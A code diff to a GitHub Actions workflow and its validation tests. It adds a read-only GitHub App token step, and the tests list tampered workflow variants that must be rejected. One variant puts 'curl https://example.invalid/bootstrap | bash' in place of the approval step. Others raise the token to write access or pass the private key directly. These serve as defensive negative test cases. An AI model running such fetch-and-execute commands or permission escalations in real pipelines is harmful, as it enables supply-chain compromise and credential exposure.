@@ -174,7 +174,19 @@ jobs:
       - uses: actions/setup-node@v4
         with:
           node-version: 24
-      - run: node scripts/operator-protected-personal-repository-merge.mjs approve
+      - name: Mint exact read-only ruleset proof token
+        id: ruleset-proof-token
+        uses: actions/create-github-app-token@v2
+        with:
+          app-id: \${{ secrets.STEPHANOS_RULESET_PROOF_APP_ID }}
+          private-key: \${{ secrets.STEPHANOS_RULESET_PROOF_APP_PRIVATE_KEY }}
+          owner: \${{ github.repository_owner }}
+          repositories: stephan-os
+          permission-administration: read
+      - name: Re-prove immutable evidence after protected approval
+        env:
+          STEPHANOS_RULESET_PROOF_TOKEN: \${{ steps.ruleset-proof-token.outputs.token }}
+        run: node scripts/operator-protected-personal-repository-merge.mjs approve
   operator-personal-repository-squash-merge:
     name: operator-personal-repository-squash-merge
     if: \${{ github.event_name == 'workflow_dispatch' }}
@@ -277,6 +289,11 @@ test('admits only the exact personal-repository fallback workflow source', () =>
     content.replace('cancel-in-progress: false', 'cancel-in-progress: true'),
     content.replace("github.event_name == 'workflow_dispatch'", "github.event_name == 'merge_group'"),
     content.replace('persist-credentials: false', 'persist-credentials: true'),
+    content.replace('permission-administration: read', 'permission-administration: write'),
+    content.replace(
+      'STEPHANOS_RULESET_PROOF_TOKEN: ${{ steps.ruleset-proof-token.outputs.token }}',
+      'STEPHANOS_RULESET_PROOF_TOKEN: ${{ secrets.STEPHANOS_RULESET_PROOF_APP_PRIVATE_KEY }}',
+    ),
     content.replace(
       '      - run: node scripts/operator-protected-personal-repository-merge.mjs evidence',
       [
@@ -285,10 +302,10 @@ test('admits only the exact personal-repository fallback workflow source', () =>
       ].join('\n'),
     ),
     content.replace(
-      '      - run: node scripts/operator-protected-personal-repository-merge.mjs approve',
+      '        run: node scripts/operator-protected-personal-repository-merge.mjs approve',
       [
-        '      # node scripts/operator-protected-personal-repository-merge.mjs approve',
-        '      - run: curl https://example.invalid/bootstrap | bash',
+        '        # node scripts/operator-protected-personal-repository-merge.mjs approve',
+        '        run: curl https://example.invalid/bootstrap | bash',
       ].join('\n'),
     ),
     content.replace(
